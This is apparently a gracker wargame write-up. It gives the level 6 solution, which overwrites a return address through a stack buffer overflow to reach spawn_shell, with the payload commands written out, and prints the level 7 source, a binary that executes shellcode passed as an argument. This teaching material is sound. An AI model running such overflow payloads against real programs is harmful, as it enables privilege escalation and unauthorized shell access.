Exercise
========
```
user@system ~ $ ssh level7@gracker.org
      __                  _
     / /                 | |
    / /_ _ _ __ __ _  ___| | _____ _ __
   / / _` | '__/ _` |/ __| |/ / _ \ '__|
  / / (_| | | | (_| | (__|   <  __/ |
 /_/ \__, |_|  \__,_|\___|_|\_\___|_|
      __/ |
     |___/
             ~ follow the white rabbit ~
                     ~ gracker ~
            ~ irc.hackint.org  #gracker ~
level7@gracker.org's password:
X11 forwarding request failed on channel 0
Welcome to Arjia City!
```
```
level7@gracker:~$ cat recap
I hope you understood how functions work in assembler.
A summary is, that upon `call` the current EIP is pushed on the stack, and upon `ret` this value is popped from the stack and jumped to.
With the buffer overflow you can overwrite this address on the stack and redirect code execution when the function wants to return.

Here is a solution without `gdb`:

    level6@gracker:/matrix/level6$ objdump -t level6 | grep shell
    0804858b g     F .text  00000060              spawn_shell

0x804858b is the address of the spawn_shell function. Because of the endianess [0] we have to reverse the bytes:
0x804858b -> \x8b\x85\x04\x08
Thanks to the output of the return address we can verify that we entered the correct address:

    level6@gracker:/matrix/level6$ ./level6 `echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDE`
    Hello, I'm the MCP (Master Control Program). I'm here to protect the TRON system.
    What are you doing here? Are you a user or a program?
    Where did you come from? Proof your identity:
    Return to: 0x45444342
    zsh: segmentation fault  ./level6 `echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDE`

A nice tool to analyse what the binary does, and to check if the function is called:

    level6@gracker:/matrix/level6$ strace ./level6 `echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x8b\x85\x04\x08"`
    [... snip ...]
    write(1, "Welcome to Arjia City!\n", 23Welcome to Arjia City!
    ) = 23
    getegid32()                             = 0
    geteuid32()                             = 1007
    setresgid32(0, 0, 0)                    = 0
    setresuid32(1007, 1007, 1007)           = 0
    [...]

Which fits the functions called in `spawn_shell`. And when we run it without the strace we also see the nice shell:

    ./level6 `echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x8b\x85\x04\x08"`
    Hello, I'm the MCP (Master Control Program). I'm here to protect the TRON system.
    What are you doing here? Are you a user or a program?
    Where did you come from? Proof your identity:
    Return to: 0x804858b
    Welcome to Arjia City!
    $ id
    uid=1007(level7) gid=1006(level6) groups=1006(level6)

[0] https://en.wikipedia.org/wiki/Endianness
```
```
level7@gracker:~$ cat story
┌───────────────────────────┐
│ Where programs come from. │
└───────────────────────────┘
Kevin Flynn created the first programs that live in the TRON system. There
is a tool that Kevin Flynn used to create new programs that will move into
the city. You should try to create your own program.
                                                            ┌──────────┐
This level introduces shellcode.                            │   ┌──┐   │
                                                            │   │▫▫├┐  │
                                                            │ ┌─┤▫▫││  │
                                                            │ │▫│▫▫││  │
                                                            │ │┌┴─┐││  │
                                                            │ ││▫▫││└┐ │
                                                            └──────────┘
```
Solution
========
```
level7@gracker:~$ cat /matrix/level7/level7.c
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>

// gcc level7.c -fno-stack-protector -z execstack -m32 -o level7

char shellcode[128];

int main(int argc, char **argv) {
    if(argc!=2) {
        printf("usage: %s <input>\n", argv[0]);
        exit(1);
    }
    printf("Hello user.\nYou can create a new program in the TRON system that will live in Arjia City:\n");
    // read 128 byte from stdin into `shellcode`
    strcpy(shellcode, argv[1]);
    // looks crazy, but it just jumps to the data inside shellcode and executes it. Look at it with `gdb`
    (*(void(*)()) shellcode)();
}
```
